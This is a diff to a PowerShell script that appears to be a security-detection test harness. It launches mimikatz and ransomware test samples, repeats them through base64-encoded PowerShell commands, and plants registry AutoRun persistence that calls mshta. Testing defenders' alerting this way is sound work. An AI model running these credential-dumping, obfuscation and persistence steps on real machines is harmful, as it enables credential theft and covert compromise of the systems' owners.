@@ -36,20 +36,20 @@ Write-EventLog -LogName System -Source "EventLog" -EntryType Information -EventI
 
 # Start
 Write-Host "Start action"
-Start-Process -FilePath "$ThreatBox\tools\mimikatz.exe -force"
+Start-Process -FilePath "$ThreatBox\tools\mimikatz.exe" -ArgumentList "-force"
 $mimi64 = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes('$ThreatBox\tools\mimikatz.exe -force'))
 powershell.exe -encoded "$mimi64"
-Start-Process -FilePath "$ThreatBox\tools\ASRSamples\ransomware_testfile_exe.exe"
+Start-Process -FilePath "$ThreatBox\tools\ASR\ASRSamples\ransomware_testfile_exe.exe"
 $ranexe64 = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes('$ThreatBox\tools\ASRSamples\ransomware_testfile_exe.exe'))
 powershell.exe -encoded "$ranexe64"
-Start-Process -FilePath "$ThreatBox\tools\ASRSamples\ransomware_testfile_doc.docm"
+Start-Process -FilePath "$ThreatBox\tools\ASR\ASRSamples\ransomware_testfile_doc.docm"
 $randoc64 = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes('$ThreatBox\tools\ASRSamples\ransomware_testfile_doc.docm'))
 powershell.exe -encoded "$randoc64"
-Start-Process -FilePath "$ThreatBox\tools\ASRSamples\UNSIGNED_ransomware_test_exe.exe -force"
+Start-Process -FilePath "$ThreatBox\tools\ASR\ASRSamples\UNSIGNED_ransomware_test_exe.exe"
 $unsignedrand64 = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes('$ThreatBox\tools\ASRSamples\UNSIGNED_ransomware_test_exe.exe -force'))
 powershell.exe -encoded "$unsignedrand64"
 
 # Persistance
-Write-Host "Droppinbg persistance"
+Write-Host "Dropping persistance"
 New-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Command Processor\AutoRun" -Name "PowerShell" -Value "powershell.exe mshta https://microsoft.com" -PropertyType "DWord"
-New-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Termainl Server Client/Default" -Name "PowerShell" -Value "powershell.exe mshta https://microsoft.com" -PropertyType "DWord"
+New-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Termainl Server Client\Default" -Name "PowerShell" -Value "powershell.exe mshta https://microsoft.com" -PropertyType "DWord"
